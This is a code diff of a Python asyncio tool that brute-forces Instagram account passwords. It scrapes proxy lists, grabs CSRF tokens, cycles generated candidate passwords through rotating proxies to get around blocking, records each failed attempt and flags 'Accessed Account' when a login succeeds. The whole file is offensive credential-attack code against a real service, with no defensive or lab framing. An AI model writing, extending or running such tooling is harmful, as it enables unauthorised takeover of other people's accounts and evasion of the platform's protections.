@@ -4,50 +4,70 @@ import logging
 import logging.config
 
 import asyncio
-import concurrent.futures
-import queue
 import time
+import signal
 
 from app import settings
 
 from app.lib import exceptions
 from app.lib.logging import EngineLogger
-from app.lib.sessions import InstagramSession
+from app.lib.sessions import InstagramSession, ProxySession
 from app.lib.users import User
-
-from app.queues import QueueManagerSync, QueueManagerAsync
 from app.lib.utils import auto_logger
 
 
-__all__ = ('EngineSync', 'EngineAsync', )
+__all__ = ('EngineAsync', )
 
 
 class Engine(object):
 
     __loggers__ = {
-        '_attack': 'Attack',
-        '_login_with_proxy': 'Login with Proxy',
-        '_get_token_for_proxy': 'Fetching Token for Proxy',
-        '_create_login_tasks': 'Queueing Up Login Tasks',
         '__base__': 'Instagram Engine',
-        '_dump_password_attempts': 'Storing Attempted Passwords',
-        'store_attempted_password': 'Storing Attempted Password',
+        'attack': 'Attack',
+        'consume_passwords': 'Login with Proxy',
+        'populate_proxies': 'Populating Proxies',
+        'populate_passwords': 'Populating Passwords',
+        'get_token': 'Fetching Token',
+        'consume_attempts': 'Storing Attempted Password',
     }
 
     def __init__(self, username):
         self.user = User(username)
-        self.queues = self.__queue_manager__(user=self.user)
 
         logging.setLoggerClass(EngineLogger)
         self.log = logging.getLogger(self.__loggers__['__base__'])
 
-    def _handle_login_api_error(self, e, log, proxy):
-        # HERE we need a way to distinguish between a bad proxy error that should
-        # result in the proxy being updated or an error that requires just
-        # sleeping and maintaining the same proxy, since if results is None,
-        # the method will just update the proxy.
 
-        print("CHECK HERE")
+class EngineAsync(Engine):
+
+    def __init__(self, username):
+        super(EngineAsync, self).__init__(username)
+        self.lock = asyncio.Lock()
+
+        self.stop_event = asyncio.Event()
+        self.token_event = asyncio.Event()
+
+        self.passwords = asyncio.Queue()
+        self.attempts = asyncio.Queue()
+
+        self.token = None
+        self.proxy_list = []
+
+        # Just to make sure we are removing them correctly
+        self.removed_proxies = []
+
+    def _handle_login_api_error(self, e, log, proxy):
+        """
+        OLD CODE:
+
+        Not currently being used, but we are going to have to deal with the
+        GENERIC_REQUEST_ERROR when we start trying to login.
+
+        We need a way to distinguish between a bad proxy error that should
+        result in the proxy being updated or an error that requires just
+        sleeping and maintaining the same proxy, since if results is None,
+        the method will just update the proxy.
+        """
         if e.__sleep__:
             log.warn(f'{e.__class__.__name__}... Sleeping {proxy.ip}')
             time.sleep(0.5)
@@ -59,224 +79,246 @@ class Engine(object):
             else:
                 raise e
 
-    @auto_logger(show_running=False)
-    def _dump_password_attempts(self, log):
-        attempts = []
-        while not self.queues.attempts.empty():
-            attempt = self.queues.get('attempt')
-            log.info(attempt)
-            attempts.append(attempt)
-        self.user.update_password_attempts(attempts)
-
-    @auto_logger(show_running=False)
-    def _login_with_proxy(self, password, token, proxy, log):
-        log.items(password=password, proxy=proxy.ip)
-
-        session = InstagramSession(self.user, proxy=proxy)
+    async def handle_exception(self, coro, loop):
         try:
-            results = session.login(password, token)
-        except exceptions.ApiException as e:
-            self._handle_login_api_error(e, log, proxy)
-            return None
-        else:
-            # self.queues.put('proxy', proxy)
-            log.info(f"Got Results for {password}: {results}")
-            return results
+            await coro
+        except Exception as e:
+            self.log.error(str(e))
+            loop.stop()
 
-    @auto_logger(show_running=False)
-    def _get_token_for_proxy(self, proxy, log):
-        log.items(proxy=proxy.ip)
+    async def shutdown(self, signal, loop):
 
-        session = InstagramSession(self.user, proxy=proxy)
-        try:
-            token = session.get_token()
-        except exceptions.ApiBadProxyException:
-            log.warn(f'Found Bad Proxy {proxy.ip}')
-        else:
-            self.queues.put('proxy', proxy)
-            return token
+        self.log.info(f'Received exit signal {signal.name}...')
+        tasks = [t for t in asyncio.all_tasks() if t is not
+            asyncio.current_task()]
 
+        [task.cancel() for task in tasks]
 
-class EngineSync(Engine):
-
-    __queue_manager__ = QueueManagerSync
-
-    def __init__(self, username):
-        self.user = User(username)
-        self.queues = self.__queue_manager__(user=self.user)
-
-        self._configure_logger()
-        self.log = logging.getLogger('Instagram Engine')
-
-    def run(self):
-        token = self._prepare()
-        self._attack(token)
-
-    def _prepare(self):
-        self.queues.populate_passwords()
-        self.queues.populate_proxies()
-
-        token = self._get_token()
-        return token
-
-    @auto_logger
-    def _attack(self, token, log):
-        while not self.queues.passwords.empty():
-            password = self.queues.passwords.get()
-            self._login(password, token)
-
-    def _login(self, password, token):
-        while True:
-            try:
-                proxy = self.queues.proxies.get()
-            except queue.Empty:
-                continue
-            else:
-                results = self._login_with_proxy(password, token, proxy)
-                if results:
-                    return results
-
-    def _get_token(self):
-        while not self.queues.proxies.empty():
-            try:
-                proxy = self.queues.proxies.get()
-            except queue.Empty:
-                continue
-            else:
-                results = self._get_token_for_proxy(proxy)
-                if results:
-                    return results
-
-
-class EngineAsync(Engine):
-
-    __queue_manager__ = QueueManagerAsync
-
-    def __init__(self, username, event_loop):
-        super(EngineAsync, self).__init__(username)
-        self.event_loop = event_loop
-
-    def _create_login_tasks(self, executor, loop, stop_event, token):
-        self.log.info("Queueing Up Login Tasks")
-
-        tasks = []
-        while not self.queues.passwords.empty() and not stop_event.is_set():
-            password = self.queues.passwords.get_nowait()
-            task = loop.run_in_executor(executor, self._login, password, token,
-                self.queues.proxy_list, stop_event)
-            tasks.append(task)
-        return tasks
-
-    def run(self):
-        asyncio.run(self._prepare())
-        token = self.queues.tokens.get_nowait()
-
-        try:
-            self.event_loop.run_until_complete(
-                self._attack(token))
-        finally:
-            self.event_loop.close()
-
-    async def _cancel_running_tasks(self, tasks):
-        for task in tasks:
-            task.cancel()
-
-    async def _prepare(self):
-
-        await self.queues.populate_passwords()
-        await self.queues.populate_proxies()
-
-        token = await self._get_token_asynchronously()
-        self.queues.tokens.put_nowait(token)
-
-    @auto_logger
-    async def _attack(self, token, log):
-
-        # Try with and without creating a new loop inside
-        loop = asyncio.get_event_loop()
-        stop_event = asyncio.Event()
-
-        executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)
-        tasks = self._create_login_tasks(executor, loop, stop_event, token)
-
+        self.log.info('Canceling outstanding tasks...')
         await asyncio.gather(*tasks)
 
-    async def _get_token_asynchronously(self):
+        loop.stop()
+        self.log.success('Shutdown complete.')
 
-        # Try with and without creating a new loop inside
+    @auto_logger
+    async def populate_passwords(self, queue, log):
+        """
+        Retrieves passwords generated passwords that have not been attempted
+        from the User object and populates the password queue.
+        """
+        count = 1
+        for password in self.user.get_new_attempts():
+            count += 1
+            queue.put_nowait(password)
+
+        if queue.empty():
+            raise exceptions.EngineException("No new passwords to try.")
+
+        log.info(f"Populated {count} Passwords")
+
+    @auto_logger
+    async def populate_proxies(self, log):
+        """
+        Retrieves proxies by using the ProxyApi to scrape links defined
+        in settings.  Each returned response is parsed and converted into
+        a list of Proxy objects.
+        """
+        def callback(fut):
+            result = fut.result()
+            for proxy in result:
+                if proxy not in self.proxy_list:
+                    self.proxy_list.append(proxy)
+
+        tasks = []
+        async with ProxySession() as session:
+            for url in settings.PROXY_LINKS:
+                log.info(f"Scraping Proxies at {url}")
+                task = asyncio.ensure_future(session.get_proxies(
+                    url,
+                ))
+                tasks.append(task)
+                task.add_done_callback(callback)
+
+            log.info(f"Scraping Proxies at {settings.EXTRA_PROXY}")
+            task = asyncio.ensure_future(session.get_extra_proxies())
+            tasks.append(task)
+            task.add_done_callback(callback)
+
+            await asyncio.gather(*tasks, return_exceptions=True)
+
+        log.info(f"Populated {len(self.proxy_list)} Proxies")
+
+    @auto_logger(show_running=False)
+    async def get_token(self, log):
+        """
+        TODO:
+        -----
+        Right now this is only doing one fetch at a time, which seems to be okay
+        since it is rather fast, but we might want to create tasks for the first
+        10 or so proxies.
+
+        There seem to be issues when creating a task for every single
+        proxy when we don't really need to, so maybe just limit them
+        for purposes of finding a token.
+
+        This might be a good place for ThreadPoolExecutor to limit number
+        of tasks.
+
         loop = asyncio.get_event_loop()
         event = asyncio.Event()
         executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)
 
-        # There is a chance that we do not get a token in any of the first 10 tasks,
-        # but we will worry about that later.
         tasks = [
             loop.run_in_executor(executor, self._get_token, event)
             for i in range(10)
         ]
 
         completed, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
-
-        event.set()
         result = completed.pop()
-        self.queues.tokens.put_nowait(result.result())
+        self.token = result.result()
 
-        await loop.shutdown_asyncgens()
-        await self._cancel_running_tasks(pending)
+        Won't let us use "async with lock" inside of callback since it is not
+        async, but this might cause problems if the proxy was already removed.
+        """
+        tasks = []
 
-        return result.result()
+        stop_event = asyncio.Event()
+        lock = asyncio.Lock()
 
-    # @auto_logger
-    # async def store_attempted_password(self, password, log):
-    #     log.info("Storing Attempting Password")
-    #     self.user.add_password_attempt(password)
+        mutated_proxy_list = self.proxy_list[:]
 
-    def _login(self, password, token, proxy_list, stop_event):
-        index = 0
-        while not stop_event.is_set():
-            # try:
-            #     proxy = self.queues.proxies.get_nowait()
-            # except IndexError:
-            #     continue
-            # else:
-            # if stop_event.is_set():
-            #     self.log.info("Aborting Task")
-            #     return
-            proxy = proxy_list[index]
-            results = self._login_with_proxy(password, token, proxy)
-            if results:
-                if results.accessed:
-                    self.log.success("Accessed Account... Setting Stop Event")
-                    stop_event.set()
+        def callback(fut):
+            exc = fut.exception()
+            if exc:
+                self.log.warn(str(exc))
+                if isinstance(exc, exceptions.ApiBadProxyException):
+                    mutated_proxy_list.remove(proxy)
 
-                    # Just doing this temporarily when dealing with a lot of
-                    # passwords so we don't lose the authenticated one.
-                    self.log.exit("Accessed Account... Setting Stop Event")
+                    # Storing temporarily to make sure we are removing them and not
+                    # using them again.
+                    self.removed_proxies.append(proxy)
                 else:
-                    self.queues.put('attempt', password)
-
-                    # Doing this asynchronously keeps hitting an event loop
-                    # closed error, so for now we will just add like this.
-                    self.user.add_password_attempt(password)
-                    # loop = asyncio.get_running_loop()
-                    # loop.run_until_complete(self.store_attempted_password(password))
-                return results
+                    raise exc
             else:
-                # We should use a lock here to make sure that we do not have
-                # multiple resources trying to remove same proxy.
+                if not self.token:
+                    result = fut.result()
+                    self.token = result.get('csrftoken').value
+
+                    log.success(f"Found Token {self.token}")
+
+                    stop_event.set()
+                    [task.cancel() for task in tasks]
+
+        async with InstagramSession() as session:
+            index = 0
+            while not stop_event.is_set() and len(mutated_proxy_list) != 0 and not self.token:
+                async with lock:
+                    proxy = mutated_proxy_list[index]
+
+                task = asyncio.ensure_future(session.get_token(proxy))
+                task.add_done_callback(callback)
                 index += 1
-                if proxy in proxy_list:
-                    proxy_list.remove(proxy)
 
-        self.log.info("Aborting Task")
+                tasks.append(task)
 
-    def _get_token(self, event):
-        while not event.is_set() and not self.queues.proxies.empty():
+                # Note commont in docstring for why this is not outside the
+                # while loop.
+                await asyncio.gather(*tasks, return_exceptions=True)
+
+    @auto_logger
+    async def attack(self, loop, log):
+
+        # May want to catch other signals too - these are not currently being
+        # used, but could probably be expanded upon.
+        signals = (signal.SIGHUP, signal.SIGTERM, signal.SIGINT)
+        for s in signals:
+            loop.add_signal_handler(
+                s, lambda s=s: asyncio.create_task(self.shutdown(s, loop)))
+
+        try:
+            prep_tasks = (
+                loop.create_task(
+                    self.handle_exception(
+                        self.populate_proxies(), loop
+                    )
+                ),
+                loop.create_task(
+                    self.handle_exception(
+                        self.populate_passwords(self.passwords), loop
+                    )
+                )
+            )
+
+            await asyncio.gather(*prep_tasks)
+
+            retrieve_token = loop.create_task(
+                self.handle_exception(
+                    self.get_token(), loop
+                )
+            )
+            await asyncio.gather(retrieve_token)
+
+            """
+            Still To Do:
+
+            consume_passwords = loop.create_task(
+                self.handle_exception(
+                    self.consume_passwords(self.passwords), loop
+                )
+            )
+            consume_attempts = loop.create_task(
+                self.handle_exception(
+                    self.consume_attempts(self.attempts), loop
+                )
+            )
+            """
+        finally:
+            logging.info('Cleaning up')
+            loop.stop()
+
+    @auto_logger(show_running=False)
+    async def consume_attempts(self, queue, log):
+        while not self.stop_event.is_set():
             try:
-                proxy = self.queues.proxies.get_nowait()
+                attempt = queue.get_nowait()
             except asyncio.QueueEmpty:
                 continue
             else:
-                token = self._get_token_for_proxy(proxy)
-                if token:
-                    return token
+                async with self.lock:
+                    self.user.add_password_attempt(attempt)
+
+    @auto_logger(show_running=False)
+    async def consume_passwords(self, queue, log):
+        while not self.stop_event.is_set():
+            try:
+                password = queue.get_nowait()
+            except asyncio.QueueEmpty:
+                continue
+            else:
+                # This will eventually throw an error when there are no more
+                # proxies, which we will have to figure out how to handle.
+                proxy = self.proxy_list[0]
+
+                log.items(password=password, proxy=proxy.ip)
+
+                session = InstagramSession(self.user, proxy=proxy)
+                try:
+                    results = session.login(password, self.token)
+
+                # TODO: Have to handle this better for siutations in which the
+                # proxy is actually invalid instead of just a timeout.
+                except exceptions.ApiException as e:
+                    self._handle_login_api_error(e, log, proxy)
+                    async with self.lock:
+                        self.proxy_list.remove(proxy)
+                else:
+                    # self.queues.put('proxy', proxy)
+                    log.info(f"Got Results for {password}: {results}")
+
+                    if results.accessed:
+                        self.log.success("Accessed Account... Setting Stop Event")
+                        self.stop_event.set()
+                        queue.task_done()
+                    else:
+                        self.attempts.put_nowait(password)
+                    return results
